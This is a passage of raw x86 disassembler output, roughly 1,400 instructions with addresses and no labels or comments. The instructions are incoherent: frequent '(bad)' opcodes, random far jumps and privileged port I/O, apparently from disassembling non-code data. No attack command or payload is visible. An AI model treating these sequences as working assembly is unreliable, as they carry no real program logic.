  694d8e:	hlt    
  694d8f:	adc    al,0xeb
  694d91:	push   ebx
  694d92:	cs xchg edx,eax
  694d94:	sub    ebx,ebp
  694d96:	(bad)  
  694d97:	bound  ecx,QWORD PTR [esi-0x4a]
  694d9a:	stc    
  694d9b:	out    dx,al
  694d9c:	iret   
  694d9d:	data16 js 0x694d4c
  694da0:	sub    ch,BYTE PTR [ecx]
  694da2:	xchg   ecx,eax
  694da3:	mov    ebp,0x65a916ca
  694da8:	mov    ebp,0xe771e4c1
  694dad:	jo     0x694d50
  694daf:	mov    ebx,0x3b41b5d4
  694db4:	mov    edi,0xf4de02
  694db9:	sub    DWORD PTR [edx+0x30e027bb],0xffffffb1
  694dc0:	aad    0x91
  694dc2:	ret    0x88fb
  694dc5:	add    esi,edx
  694dc7:	out    0x2c,al
  694dc9:	mov    dl,0xea
  694dcb:	jecxz  0x694e1d
  694dcd:	xchg   esi,esp
  694dcf:	or     ebp,eax
  694dd1:	jb     0x694dc1
  694dd3:	mov    DWORD PTR [ecx],0x9c02d2ff
  694dd9:	jmp    0xffd3f73d
  694dde:	and    DWORD PTR [esi+0x7c],edi
  694de1:	mov    WORD PTR [edx-0x402c07ae],ss
  694de7:	push   ebp
  694de8:	push   es
  694de9:	mov    ch,BYTE PTR [esi-0x2]
  694dec:	mov    DWORD PTR [ebp+0x791753da],esp
  694df2:	xchg   ecx,eax
  694df3:	sub    ah,dl
  694df5:	pop    es
  694df6:	push   edi
  694df7:	jb     0x694db3
  694df9:	je     0x694e34
  694dfb:	jo     0x694e77
  694dfd:	sub    esi,DWORD PTR ds:0x80f96852
  694e03:	push   es
  694e04:	mov    ecx,0x7a05d8a2
  694e09:	mov    ebx,0xc6403d9
  694e0e:	add    al,0xee
  694e10:	adc    esp,DWORD PTR [ecx+eiz*4+0x52]
  694e14:	xchg   BYTE PTR [esi-0x5716d2e7],bl
  694e1a:	push   edx
  694e1b:	mov    al,0x64
  694e1d:	cmp    BYTE PTR [ebx+0x1b0ee013],0xf8
  694e24:	dec    edi
  694e25:	inc    ebx
  694e26:	dec    esp
  694e27:	dec    edi
  694e28:	mov    cl,0x46
  694e2a:	ins    BYTE PTR es:[edi],dx
  694e2b:	shl    DWORD PTR [esi+0x7d4fa5a],0xe9
  694e32:	mov    DWORD PTR [eax],eax
  694e34:	cs adc al,0xa2
  694e37:	out    dx,eax
  694e38:	mov    dh,0xf5
  694e3a:	stos   BYTE PTR es:[edi],al
  694e3b:	jnp    0x694e15
  694e3d:	(bad)  
  694e3e:	cmp    eax,0x4204030
  694e43:	je     0x694e76
  694e45:	or     esi,DWORD PTR [esi]
  694e47:	mov    ch,0xe
  694e49:	leave  
  694e4a:	dec    esi
  694e4b:	fisttp QWORD PTR ds:0x9c721202
  694e51:	bound  esp,QWORD PTR [ebp+eax*2-0x3]
  694e55:	cdq    
  694e56:	cmp    edi,DWORD PTR ds:0x99e72e05
  694e5c:	or     edx,DWORD PTR [ebp-0xe]
  694e5f:	xor    al,ch
  694e61:	or     ebx,DWORD PTR [ecx+0x1dc026c6]
  694e67:	xchg   esp,eax
  694e68:	adc    eax,DWORD PTR [ebp+0x79afceef]
  694e6e:	pop    es
  694e6f:	aaa    
  694e70:	fadd   QWORD PTR [edi]
  694e72:	minps  xmm2,XMMWORD PTR [ecx]
  694e75:	or     dl,BYTE PTR [edx+0x40462dff]
  694e7b:	jne    0x694e5d
  694e7d:	fild   DWORD PTR [ebx+0x2]
  694e80:	push   cs
  694e81:	hlt    
  694e82:	push   edx
  694e83:	aas    
  694e84:	xchg   ebx,eax
  694e85:	(bad)  
  694e89:	lods   al,BYTE PTR ds:[esi]
  694e8a:	push   edx
  694e8b:	nop
  694e8c:	inc    eax
  694e8d:	ret    
  694e8e:	pop    ss
  694e8f:	out    0x10,al
  694e91:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  694e92:	idiv   BYTE PTR [ecx+esi*2]
  694e95:	cmp    esi,ebp
  694e97:	test   BYTE PTR [esi+0x62],dl
  694e9a:	in     eax,0xda
  694e9c:	cld    
  694e9d:	out    0x6b,eax
  694e9f:	in     eax,dx
  694ea0:	xchg   esi,eax
  694ea1:	fstp   st(2)
  694ea3:	aas    
  694ea4:	pop    ebx
  694ea5:	pushf  
  694ea6:	ss jle 0x694ead
  694ea9:	test   eax,eax
  694eab:	sbb    BYTE PTR [edi+0x156070ad],ah
  694eb1:	popa   
  694eb2:	mov    edx,0xd15f1205
  694eb7:	rol    dh,1
  694eb9:	test   BYTE PTR [edx-0x26],ch
  694ebc:	sahf   
  694ebd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  694ebe:	outs   dx,BYTE PTR ds:[esi]
  694ebf:	shl    BYTE PTR [ecx],1
  694ec1:	adc    al,0xec
  694ec3:	mov    WORD PTR [edx-0x7512b044],cs
  694ec9:	lods   eax,DWORD PTR ds:[esi]
  694eca:	push   ecx
  694ecb:	cs jb  0x694e8a
  694ece:	sbb    DWORD PTR [edx],edx
  694ed0:	cmp    al,0xf4
  694ed2:	(bad)  
  694ed3:	jge    0x694f4a
  694ed5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  694ed6:	nop
  694ed7:	xchg   ecx,eax
  694ed8:	and    edx,edi
  694eda:	push   ebp
  694edb:	(bad)  
  694edc:	pop    ecx
  694edd:	aad    0x53
  694edf:	pop    eax
  694ee0:	test   eax,0x2ad0e8e1
  694ee5:	(bad)  
  694ee6:	out    0xb9,eax
  694ee8:	jno    0x694f4d
  694eea:	jae    0x694e78
  694eec:	daa    
  694eed:	mov    eax,ds:0xded0d51f
  694ef2:	loopne 0x694f10
  694ef4:	das    
  694ef5:	ds add al,0xe7
  694ef8:	inc    edi
  694ef9:	bound  eax,QWORD PTR [esp+esi*1]
  694efc:	cwde   
  694efd:	dec    ecx
  694efe:	jo     0x694ee5
  694f00:	adc    al,0xe1
  694f02:	fdivr  st,st(2)
  694f04:	inc    eax
  694f05:	push   cs
  694f06:	cmp    al,0x3f
  694f08:	push   ebp
  694f09:	mov    edi,ss
  694f0b:	retf   
  694f0c:	cli    
  694f0d:	xchg   ebp,eax
  694f0e:	or     al,0x4c
  694f10:	push   eax
  694f11:	mov    ch,0x60
  694f13:	nop
  694f14:	fist   WORD PTR [edx+0x625cbc34]
  694f1a:	ret    0x2ec0
  694f1d:	(bad)  
  694f1e:	aad    0x64
  694f20:	fwait
  694f21:	inc    edx
  694f22:	xor    edi,DWORD PTR [eax]
  694f24:	pop    ss
  694f25:	bound  edx,QWORD PTR [eax]
  694f27:	sbb    al,0x36
  694f2a:	lock push ebx
  694f2c:	ja     0x694f5f
  694f2e:	jbe    0x694f82
  694f30:	imul   edx,DWORD PTR [edi],0x508aca94
  694f36:	cdq    
  694f37:	add    esi,DWORD PTR [ebx+0x7c]
  694f3a:	fcmove st,st(2)
  694f3c:	stos   DWORD PTR es:[edi],eax
  694f3d:	repnz das 
  694f3f:	aas    
  694f40:	out    0x31,al
  694f42:	int    0xf9
  694f44:	(bad)  
  694f45:	jo     0x694ee5
  694f47:	pop    ebx
  694f48:	or     ch,dl
  694f4a:	adc    eax,0xf21c3c8
  694f4f:	outs   dx,BYTE PTR ss:[esi]
  694f51:	jl     0x694f6f
  694f53:	bound  edx,QWORD PTR [eax-0x39380709]
  694f59:	jbe    0x694f61
  694f5b:	imul   esp,DWORD PTR [esi-0x15a17947],0x7c
  694f62:	cmp    eax,DWORD PTR [ebp+ecx*4+0x24768df0]
  694f69:	lea    esp,[esi]
  694f6b:	mov    ch,ah
  694f6d:	xchg   edi,eax
  694f6e:	xchg   edi,eax
  694f6f:	out    dx,eax
  694f70:	mov    ch,0x64
  694f72:	into   
  694f73:	push   cs
  694f74:	sub    al,0x65
  694f76:	push   esi
  694f77:	(bad)  
  694f78:	std    
  694f79:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  694f7a:	js     0x694f00
  694f7c:	fisubr WORD PTR fs:[ebx+esi*4-0x7310c30f]
  694f84:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  694f85:	or     bl,BYTE PTR [edi+0x50b03345]
  694f8b:	and    al,BYTE PTR [edi]
  694f8d:	shl    BYTE PTR [ebx+0x54],1
  694f90:	mov    WORD PTR [edi+0x15107e],es
  694f96:	inc    ecx
  694f97:	cmp    esi,DWORD PTR [ebx+0x17]
  694f9a:	and    eax,0xb3c817e1
  694f9f:	adc    bl,BYTE PTR [edx+0x11a9bb52]
  694fa5:	sbb    DWORD PTR [edx-0xf5b6910],esi
  694fab:	cmp    edx,DWORD PTR [ecx+eiz*4-0x41]
  694faf:	xchg   esi,eax
  694fb0:	fdiv   DWORD PTR fs:[esi+0x44]
  694fb4:	jecxz  0x694f85
  694fb6:	pop    ebx
  694fb7:	mov    ds:0x5657194a,eax
  694fbc:	int3   
  694fbd:	in     al,0x5b
  694fbf:	xchg   ebx,eax
  694fc0:	push   ecx
  694fc1:	out    0xbd,al
  694fc3:	and    ebx,DWORD PTR [eax+edi*4-0x62128236]
  694fca:	inc    eax
  694fcb:	jmp    0x7a1e:0x993afda
  694fd2:	add    DWORD PTR [esi-0x7d58e313],edi
  694fd8:	test   DWORD PTR [eax+0x288196fd],ecx
  694fde:	rol    DWORD PTR [esi+0x198db9aa],1
  694fe4:	jmp    0x84a751b5
  694fe9:	xor    esp,DWORD PTR [edi-0xd]
  694fec:	es stc 
  694fee:	xchg   ebx,eax
  694fef:	sbb    al,ah
  694ff1:	mov    ecx,0xb015ed35
  694ff6:	shl    BYTE PTR [esi],0x4f
  694ff9:	popf   
  694ffa:	aad    0xce
  694ffc:	sub    dh,BYTE PTR [edx+ebx*4+0x726a2cec]
  695003:	mov    esp,0xd3b8a31
  695008:	dec    edi
  695009:	push   ds
  69500a:	pop    ecx
  69500b:	ins    DWORD PTR es:[edi],dx
  69500c:	cld    
  69500d:	add    eax,0xbf4f47d
  695012:	iret   
  695013:	dec    edi
  695014:	push   0x5c
  695016:	inc    esp
  695017:	in     eax,0x14
  695019:	push   ds
  69501a:	retf   
  69501b:	inc    ecx
  69501c:	cmp    DWORD PTR [ebx],0x18
  69501f:	xor    al,bl
  695021:	les    esp,FWORD PTR [eax]
  695023:	push   ds
  695024:	cmp    bl,BYTE PTR [esi-0x61]
  695027:	jne    0x694fe2
  695029:	sbb    eax,0xf8f388e5
  69502e:	pop    es
  69502f:	cmp    BYTE PTR [esi],dl
  695031:	inc    ecx
  695032:	mov    ecx,0x97e39a96
  695037:	cmp    BYTE PTR [ebx-0x754dce68],0x65
  69503e:	std    
  69503f:	cs push ecx
  695041:	retf   0xa5d0
  695044:	rcr    DWORD PTR [ebx],1
  695046:	lods   eax,DWORD PTR ds:[esi]
  695047:	xchg   edi,eax
  695048:	ja     0x695063
  69504a:	aad    0xf6
  69504c:	xchg   esp,eax
  69504d:	xor    edx,DWORD PTR [ebx-0x27]
  695050:	out    0x39,al
  695052:	dec    ebx
  695053:	mov    ch,0x8c
  695055:	add    bl,BYTE PTR [ebp+0x54]
  695058:	push   eax
  695059:	cmp    al,0x3f
  69505b:	and    al,0xb5
  69505d:	stc    
  69505e:	mov    cl,0x1d
  695060:	repz dec esi
  695062:	push   edx
  695063:	mov    cr6,eax
  695066:	test   al,0xfa
  695068:	enter  0x4cd8,0x8a
  69506c:	dec    ebp
  69506d:	dec    esp
  69506e:	mov    esp,DWORD PTR [ebx]
  695070:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  695071:	adc    eax,0xc9f32575
  695076:	lahf   
  695077:	js     0x695085
  695079:	mov    esi,0xd5102be7
  69507e:	adc    DWORD PTR [eax+0x71],esp
  695081:	cli    
  695082:	mov    ebx,DWORD PTR [esi+0x6a]
  695085:	mov    dh,0x35
  695087:	push   ss
  695088:	ror    DWORD PTR [edx-0x455477b],0xd6
  69508f:	pop    es
  695090:	pop    eax
  695091:	jno    0x6950d1
  695093:	aam    0x25
  695095:	xchg   esp,eax
  695096:	sbb    DWORD PTR [esi+0x2b9d17bd],eax
  69509c:	jl     0x695038
  69509e:	push   edx
  69509f:	repz push es
  6950a1:	ret    0x25b5
  6950a4:	dec    edi
  6950a5:	dec    ebp
  6950a6:	aaa    
  6950a7:	cmp    DWORD PTR [ecx],0x1d
  6950aa:	or     eax,0x9ca4185b
  6950af:	jns    0x695076
  6950b1:	int    0xce
  6950b3:	xor    cl,dh
  6950b5:	dec    eax
  6950b6:	int    0x5a
  6950b8:	into   
  6950b9:	jnp    0x695054
  6950bb:	and    eax,ebp
  6950bd:	out    0x20,eax
  6950bf:	pop    ss
  6950c0:	repz loopne 0x695075
  6950c3:	sbb    edi,esp
  6950c5:	cmp    DWORD PTR [edi],0x3067b781
  6950cb:	aaa    
  6950cc:	sub    ch,cl
  6950ce:	push   ebx
  6950cf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  6950d0:	stos   BYTE PTR es:[edi],al
  6950d1:	or     al,cl
  6950d3:	ins    BYTE PTR es:[edi],dx
  6950d4:	popa   
  6950d5:	shl    DWORD PTR [ebx+0x36a62ccd],cl
  6950db:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  6950dc:	std    
  6950dd:	xor    al,0xec
  6950df:	mov    WORD PTR [ebx-0x4a],cs
  6950e2:	jb     0x6950ee
  6950e4:	xor    ebx,0x4b
  6950e7:	mov    al,ds:0x38722a3c
  6950ec:	mov    al,0x2
  6950ee:	push   ebp
  6950ef:	call   0xa657:0xd2ba1e0d
  6950f6:	cdq    
  6950f7:	pusha  
  6950f8:	pop    es
  6950f9:	mov    ebx,0x91ea2e6
  6950fe:	push   ecx
  6950ff:	adc    eax,DWORD PTR [ebx-0x2565a18c]
  695105:	mov    ebp,0x60f79ea0
  69510a:	popa   
  69510b:	jp     0x6950a4
  69510d:	icebp  
  69510e:	das    
  69510f:	xor    BYTE PTR [esi],dh
  695111:	(bad)  
  695112:	imul   esp,DWORD PTR [ebp-0x41f6dd69],0xcb43e024
  69511c:	cmp    al,0xe5
  69511e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  69511f:	pop    ecx
  695120:	xchg   DWORD PTR ds:0xe3ff9bfe,edi
  695126:	push   ebx
  695127:	addr16 std 
  695129:	les    esi,FWORD PTR [esi+0x31]
  69512c:	(bad)  
  69512d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  69512e:	push   ss
  69512f:	repz dec esi
  695131:	out    dx,eax
  695132:	push   esi
  695133:	shr    DWORD PTR [edi-0x1a],cl
  695136:	sub    BYTE PTR [edx+0x42195130],bl
  69513c:	ficomp WORD PTR [eax-0x5acd19d2]
  695142:	inc    esi
  695143:	xor    al,0xa3
  695145:	push   es
  695146:	jae    0x6950e0
  695148:	add    al,0xc1
  69514a:	push   ebx
  69514b:	jmp    0x5f96:0x40656a28
  695152:	pop    ebp
  695153:	retf   
  695154:	int    0x25
  695156:	cmp    BYTE PTR [esi+edi*1+0x40],al
  69515a:	fdiv   st,st(2)
  69515c:	fst    DWORD PTR [ebp+0x25]
  69515f:	mov    ebx,0xb1ab8b4e
  695164:	xor    cl,al
  695166:	fsubr  st,st(7)
  695168:	sub    eax,DWORD PTR [edx+0x13]
  69516b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  69516c:	mov    bl,0x39
  69516e:	mov    cl,0xe5
  695170:	test   al,0x6b
  695172:	les    ecx,FWORD PTR [edi]
  695174:	mov    edx,0xf6eecdc0
  695179:	mov    eax,ds:0x5ebb0b22
  69517e:	lods   eax,DWORD PTR es:[esi]
  695180:	mov    ah,0x41
  695182:	in     al,dx
  695183:	jg     0x69511e
  695185:	cdq    
  695186:	jg     0x6951d7
  695188:	ficom  WORD PTR [ecx]
  69518a:	nop
  69518b:	mov    cs,WORD PTR [edi]
  69518d:	inc    dl
  69518f:	call   0x8dbc0bd0
  695194:	pop    ebx
  695195:	stos   DWORD PTR es:[edi],eax
  695196:	mov    esp,0xf1b944b4
  69519b:	div    BYTE PTR [edx-0x49abcdce]
  6951a1:	mov    edi,0x7fd6fd8d
  6951a6:	ret    
  6951a7:	jecxz  0x6951d9
  6951a9:	cwde   
  6951aa:	dec    edi
  6951ab:	stc    
  6951ac:	xchg   DWORD PTR [edx-0x43d169a9],edi
  6951b2:	aad    0x48
  6951b4:	sbb    esi,DWORD PTR [esi+0x26]
  6951b7:	scas   al,BYTE PTR es:[edi]
  6951b8:	xor    bh,BYTE PTR ds:0x8430ab9b
  6951be:	fild   QWORD PTR [ecx-0x4b]
  6951c1:	arpl   WORD PTR [edx],dx
  6951c3:	and    dh,0x59
  6951c6:	mov    bh,0x1a
  6951c8:	mov    es,WORD PTR [ebp-0x24d1c1]
  6951ce:	leave  
  6951cf:	test   eax,0x79c6f68b
  6951d4:	cmp    al,0x64
  6951d6:	adc    DWORD PTR [edi],eax
  6951d8:	(bad)  
  6951d9:	jp     0x695213
  6951db:	sub    al,BYTE PTR gs:0xd1525a02
  6951e2:	(bad)  ds:0xd0890bbf
  6951e8:	dec    ebx
  6951e9:	mov    DWORD PTR [edx-0x455b1abf],0x83550f7
  6951f3:	jl     0x695253
  6951f5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  6951f6:	sbb    al,0x19
  6951f8:	imul   eax,DWORD PTR [esi],0x67b67ceb
  6951fe:	je     0x69524d
  695200:	inc    ecx
  695201:	int3   
  695202:	pop    ebx
  695203:	xor    BYTE PTR [edi],0x9d
  695206:	push   ss
  695207:	push   0x54
  695209:	rcr    DWORD PTR [esi-0x56c24f63],0x73
  695210:	leave  
  695211:	jbe    0x69520b
  695213:	inc    edx
  695214:	adc    edi,esp
  695216:	mov    dh,0x48
  695218:	(bad)  
  695219:	xchg   ebp,eax
  69521a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  69521b:	sahf   
  69521c:	add    cl,BYTE PTR [ebx-0x2f]
  69521f:	cmc    
  695220:	mov    ecx,0x8e6640ed
  695225:	shl    BYTE PTR [edx+0x1a7c426e],cl
  69522b:	in     eax,0x60
  69522d:	fcomp  st(1)
  69522f:	jmp    0x69529c
  695231:	outs   dx,BYTE PTR ds:[esi]
  695232:	loope  0x695247
  695234:	aas    
  695235:	icebp  
  695236:	es idiv ah
  695239:	mov    cl,0x6f
  69523b:	inc    eax
  69523c:	sbb    ebp,DWORD PTR [eax+esi*8]
  69523f:	mov    cl,0xa2
  695241:	call   0x3565:0x171e563
  695248:	sbb    eax,0xcfe058bf
  69524d:	leave  
  69524e:	inc    ebx
  69524f:	jecxz  0x695216
  695251:	(bad)  
  695252:	xchg   esi,eax
  695253:	test   DWORD PTR [ebp-0x34],ebx
  695256:	sub    edx,esi
  695258:	popf   
  695259:	sub    edx,DWORD PTR [edi]
  69525b:	add    DWORD PTR [edx+0x2],0x7f
  69525f:	sub    BYTE PTR [ecx+0x5eb09d92],dh
  695265:	adc    BYTE PTR [eax+0x76],dh
  695268:	pop    edx
  695269:	int    0x4b
  69526b:	sbb    bh,BYTE PTR [edx]
  69526d:	sahf   
  69526e:	jmp    0xb7c5a3db
  695273:	sbb    BYTE PTR [edi+ecx*8+0x396373],bh
  69527a:	popa   
  69527b:	js     0x69529c
  69527d:	mov    dh,0xca
  69527f:	pop    edi
  695280:	pop    ds
  695281:	pop    ebx
  695282:	jecxz  0x695272
  695284:	xchg   ebp,eax
  695285:	jb     0x69528e
  695287:	xor    al,0x63
  695289:	pop    es
  69528a:	sbb    ah,ch
  69528c:	imul   BYTE PTR [edi+edx*8+0x5c]
  695290:	push   esi
  695291:	push   ss
  695292:	jmp    0x6952bc
  695294:	adc    DWORD PTR [ecx+0x41e5178f],edx
  69529a:	nop
  69529b:	shl    DWORD PTR [esp+eiz*8],0x44
  69529f:	retf   0x8427
  6952a2:	rcl    BYTE PTR [edx-0x5f3e7741],0x89
  6952a9:	xor    BYTE PTR [ebx+0x5],dl
  6952ac:	dec    esp
  6952ad:	push   esp
  6952ae:	sub    BYTE PTR ds:0x8fc5045f,al
  6952b4:	jl     0x6952a8
  6952b6:	add    ebp,edx
  6952b8:	push   edi
  6952b9:	push   ebp
  6952ba:	out    0x89,al
  6952bc:	aam    0x76
  6952be:	mul    DWORD PTR [ebp+0x7a7ef9c6]
  6952c4:	daa    
  6952c5:	les    eax,FWORD PTR [eax+0x5eb3a121]
  6952cb:	sub    dh,BYTE PTR [ebx]
  6952cd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  6952ce:	fmul   QWORD PTR [ebp+0x30]
  6952d1:	ret    0x3977
  6952d4:	xor    esp,eax
  6952d6:	sar    DWORD PTR [edi],cl
  6952d8:	sub    eax,0xacbdc4b0
  6952dd:	inc    ecx
  6952de:	mov    ch,0x31
  6952e0:	ficomp WORD PTR [edx+eiz*2]
  6952e3:	jmp    0xfa000d25
  6952e8:	das    
  6952e9:	mov    ah,0xd6
  6952eb:	test   dh,ah
  6952ed:	push   ecx
  6952ee:	call   0xcad0b43
  6952f3:	mov    al,ds:0x3e642c7a
  6952f8:	xchg   ebx,eax
  6952f9:	xor    bl,BYTE PTR [edi-0x3361cac0]
  6952ff:	fsub   QWORD PTR [ebp+0x3c]
  695302:	inc    esp
  695303:	mov    ds:0x4135c103,eax
  695308:	pop    esi
  695309:	ror    esp,cl
  69530b:	xchg   edi,eax
  69530c:	mov    BYTE PTR [eax-0x50],al
  69530f:	mov    ch,BYTE PTR [ebx-0x4b59fe9a]
  695315:	fadd   QWORD PTR [edx-0x13]
  695318:	dec    ebx
  695319:	add    BYTE PTR [edx-0x50],ah
  69531c:	cmp    dh,bh
  69531e:	fiadd  WORD PTR [ebx+ecx*4-0x43]
  695322:	in     al,0x85
  695324:	imul   edx,DWORD PTR [ebx-0x19922726],0x2c25772b
  69532e:	sbb    al,bh
  695330:	mov    fs,WORD PTR [ebp-0x5d]
  695333:	sbb    eax,0x56b9c773
  695338:	jnp    0x69538a
  69533a:	add    eax,DWORD PTR [ebp-0x5b2a6a6b]
  695340:	jecxz  0x695324
  695342:	jmp    0xe4d39e3d
  695347:	push   eax
  695348:	stos   BYTE PTR es:[edi],al
  695349:	loopne 0x695382
  69534b:	jne    0x6953bd
  69534d:	mov    ebx,0xd95ee422
  695352:	retf   0x9573
  695355:	add    al,0x84
  695357:	adc    al,0x24
  695359:	pop    ebx
  69535a:	cwde   
  69535b:	mov    edx,0x6ec170d4
  695360:	(bad)  [ebx+0x457732ad]
  695366:	mov    dh,0x75
  695368:	cmp    al,0x20
  69536a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  69536b:	iret   
  69536c:	aad    0xd9
  69536e:	shl    BYTE PTR [esi],cl
  695370:	and    eax,0xe1df8ba9
  695375:	test   BYTE PTR [edx-0x41e03c8f],bh
  69537b:	add    bl,BYTE PTR [ebx-0x18]
  69537e:	add    ecx,DWORD PTR ss:[ebx+0x44]
  695382:	imul   eax,DWORD PTR [eax],0x5456ace4
  695388:	cdq    
  695389:	push   0x3d
  69538b:	aad    0x34
  69538d:	xchg   edx,eax
  69538e:	cli    
  69538f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  695390:	sar    DWORD PTR ds:0x7b688e,cl
  695396:	bound  edi,QWORD PTR [ecx-0x35]
  695399:	push   ebx
  69539a:	mov    esp,0xad16baad
  69539f:	mov    bl,0x2f
  6953a1:	xor    ecx,DWORD PTR [ebp+0x33]
  6953a4:	push   es
  6953a5:	push   ebx
  6953a6:	test   eax,0xa1d28e26
  6953ab:	into   
  6953ac:	js     0x6953a4
  6953ae:	cli    
  6953af:	call   DWORD PTR [edx]
  6953b1:	(bad)  
  6953b2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  6953b3:	mov    dl,0x1a
  6953b5:	fisub  DWORD PTR [ecx]
  6953b7:	ret    0xceb4
  6953ba:	dec    esp
  6953bb:	inc    eax
  6953bc:	dec    eax
  6953bd:	fmul   st(3),st
  6953bf:	xlat   BYTE PTR ds:[ebx]
  6953c0:	ret    
  6953c1:	inc    ecx
  6953c2:	mov    ds:0xa57e5d53,al
  6953c7:	xchg   esi,eax
  6953c8:	in     eax,0x9a
  6953ca:	mov    dl,0xdf
  6953cc:	push   ebp
  6953cd:	push   edi
  6953ce:	aam    0xd4
  6953d0:	dec    ebp
  6953d1:	pop    ecx
  6953d2:	shl    ebx,cl
  6953d4:	nop
  6953d5:	clc    
  6953d6:	inc    ebx
  6953d7:	xor    dl,BYTE PTR [ebp+eiz*2-0x26]
  6953db:	repnz rcr DWORD PTR [esi-0x31],1
  6953df:	mov    esi,esi
  6953e1:	into   
  6953e2:	ss sbb eax,0x4b05dc0f
  6953e8:	push   eax
  6953e9:	lea    ecx,ds:0x4ad0b09
  6953ef:	jg     0x6953ed
  6953f1:	pop    ds
  6953f2:	ins    DWORD PTR es:[edi],dx
  6953f3:	sbb    DWORD PTR [eax+ebp*4+0x3b912d56],esi
  6953fa:	mov    ?,WORD PTR [eax]
  6953fc:	pop    DWORD PTR [eax-0x54bc17e5]
  695402:	test   ecx,0x8b146029
  695408:	xlat   BYTE PTR ds:[ebx]
  695409:	enter  0x3b7a,0xe1
  69540d:	mov    al,0xf7
  69540f:	sub    eax,0x1a7d0833
  695414:	xlat   BYTE PTR ds:[ebx]
  695415:	add    BYTE PTR [eax+0x266f9682],0x80
  69541c:	add    ecx,DWORD PTR [ebx+0x4d]
  69541f:	out    0x15,eax
  695421:	inc    esp
  695422:	inc    esp
  695423:	inc    ebp
  695424:	call   0x2fea:0x38f7d2c9
  69542b:	mov    bh,0xfa
  69542d:	push   ecx
  69542e:	pop    esi
  69542f:	sub    eax,0x91626dfd
  695434:	clc    
  695435:	adc    BYTE PTR [edx+0x40bf7404],bl
  69543b:	mov    ds:0x4d44a6e8,eax
  695440:	push   edx
  695441:	add    BYTE PTR [ecx+0x1c],bl
  695444:	push   0x2958f841
  695449:	push   edx
  69544a:	push   eax
  69544b:	movhps xmm3,QWORD PTR [edx+0x5f39e20]
  695452:	sahf   
  695453:	push   edx
  695454:	add    eax,0xe2705377
  695459:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  69545a:	daa    
  69545b:	sbb    BYTE PTR [esp+ebp*1],ah
  69545e:	dec    edi
  69545f:	jmp    0xd2c18e1e
  695464:	int    0x38
  695466:	or     dh,BYTE PTR [ecx+0x553526be]
  69546c:	inc    ecx
  69546d:	pop    edi
  69546e:	or     ah,BYTE PTR [ebx]
  695470:	retf   
  695471:	stos   BYTE PTR es:[edi],al
  695472:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  695473:	loopne 0x6953fd
  695475:	aaa    
  695476:	cs inc edx
  695478:	xor    bh,BYTE PTR [esi+0x481077d9]
  69547e:	cmp    DWORD PTR [ebp+0x1c],ebx
  695481:	sub    al,0x28
  695483:	and    ah,BYTE PTR [ebx-0x4977e1ed]
  695489:	stc    
  69548a:	mov    dh,0xb0
  69548c:	es ja  0x695412
  69548f:	lods   eax,DWORD PTR ds:[esi]
  695490:	das    
  695491:	sbb    al,cl
  695493:	ror    BYTE PTR [ecx+0x25],1
  695496:	and    BYTE PTR [ecx-0x49ddc38],0x86
  69549d:	add    bl,BYTE PTR ds:0xf0130a3c
  6954a3:	out    0xd7,eax
  6954a5:	retf   0x494c
  6954a8:	mov    esi,0x149e83e
  6954ad:	inc    esi
  6954ae:	inc    ebp
  6954af:	or     esi,DWORD PTR [ebx-0x76]
  6954b2:	pop    ss
  6954b3:	mov    al,ds:0x7b176bf6
  6954b8:	jbe    0x6954df
  6954ba:	jmp    0x60e1e212
  6954bf:	and    DWORD PTR [edx-0x3],edi
  6954c2:	daa    
  6954c3:	mov    al,0x14
  6954c5:	sub    al,0x5b
  6954c7:	xchg   ecx,eax
  6954c8:	iret   
  6954c9:	inc    ebx
  6954ca:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  6954cb:	jg     0x695482
  6954cd:	or     al,0x36
  6954cf:	ins    BYTE PTR es:[edi],dx
  6954d0:	imul   edi,esi,0xffffffc9
  6954d3:	jmp    DWORD PTR [edi+0x655f183]
  6954d9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  6954da:	add    eax,0x5b73fcb6
  6954df:	fidivr DWORD PTR ds:0x772ffeca
  6954e5:	or     dh,dl
  6954e7:	cmp    bl,dh
  6954e9:	mov    ds,esi
  6954eb:	arpl   WORD PTR [edi],di
  6954ed:	push   cs
  6954ee:	mov    ebp,DWORD PTR [edx-0x2c7515bc]
  6954f4:	xor    DWORD PTR [ebp-0x71],edx
  6954f7:	inc    ebp
  6954f8:	iret   
  6954f9:	cdq    
  6954fa:	mov    ch,0xe2
  6954fc:	je     0x6954c1
  6954fe:	ret    
  6954ff:	inc    edx
  695500:	add    ch,cl
  695502:	icebp  
  695503:	mov    cl,0xbb
  695505:	fist   WORD PTR [esi-0x235097d2]
  69550b:	mov    eax,0x9f218194
  695510:	call   0x397f22cd
  695515:	hlt    
  695516:	sbb    DWORD PTR [eax+esi*2],0x45ebfac2
  69551d:	or     al,0xf3
  69551f:	push   0x2d69591a
  695524:	cli    
  695525:	cmp    eax,0x1f03c81f
  69552a:	je     0x69558b
  69552c:	pop    es
  69552d:	in     eax,0x41
  69552f:	add    esi,DWORD PTR [eax-0x60a94508]
  695535:	mov    edx,ebp
  695537:	rol    ah,1
  695539:	sub    dl,BYTE PTR [ebp+0xc0ab821]
  69553f:	das    
  695540:	mov    eax,ds:0x6a63adfc
  695545:	dec    ecx
  695546:	jecxz  0x6954f2
  695548:	xor    eax,0xbb8f9704
  69554d:	or     eax,0xf25178bd
  695552:	retf   
  695553:	mul    dh
  695555:	xchg   edi,eax
  695556:	scas   eax,DWORD PTR es:[edi]
